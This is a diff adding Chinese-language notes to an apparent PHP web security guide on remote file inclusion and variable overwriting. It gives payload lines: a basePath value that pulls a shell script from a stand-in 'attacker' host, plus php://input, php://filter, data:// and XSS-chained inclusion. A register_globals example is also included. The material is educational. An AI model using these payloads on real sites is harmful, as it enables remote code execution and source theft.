@@ -1367,13 +1367,87 @@ if ($route == "share") {
 
 
 
+构造变量basePath的值
+
+~~~php
+/?basePath=http://attacker/phpshell.txt?
+~~~
+
+最终的代码执行了
+
+~~~php
+require_once "http://attacker/phpshell.txt?/action/m_share.php";
+~~~
+
+问号后的部分被解释为URL的querystring，这也是一种截断
+
++ 普通远程文件包含
+
+  ~~~php
+  ?file=[http|https|ftp]://example.com/shell.txt
+  ~~~
+
+  需要`allow_url_fopen=On`并且 `allow_url_include=On`
+
++ 利用PHP流input
+
+  ~~~php
+  ?file=php://input
+  ~~~
+
+  需要 `allow_url_include=On`
+
++ 利用PHP流filter
+
+  ~~~php
+  ?file=php://filter/convert.base64-encode/resource=index.php
+  ~~~
+
+  需要 `allow_url_include=On`
+
++ 利用Data URIs
+
+  ~~~php
+  ?file=data://text/plain;base64;SSBsb3ZlIFBIUAo=
+  ~~~
+
+  需要 `allow_url_include=On` 。
+
++ 利用XSS执行
+
+  ~~~php
+  ?file=http://127.0.0.1/path/xss.php?xss=phpcode
+  ~~~
+
+  需要 `allow_url_fopen=On allow_url_include=On`并且防火墙或者白名单不允许访问外网时，先在同站点找一个XSS漏洞，包含这个页面，就可以注入恶意代码了。
+
+### 变量覆盖
+
+#### 全局变量覆盖
+
+变量如果没有被初始化，且能够被用户所控制，那么很可能会导致安全问题。
+
+~~~php
+register_globals=ON
+~~~
+
+示例
+
+~~~php
+<?php
+echo "Register_globals: " . (int)ini_get("register_globals") . "<br/>";
+
+if ($auth) {
+  echo "private!";
+}
+?>
+~~~
+
+当 `register_globals=ON` 时，提交 `test.php?auth=1`，`auth` 变量将自动得到赋值。
 
 
 
-
-
-
-
+## XXE
 
 ## IDS
 
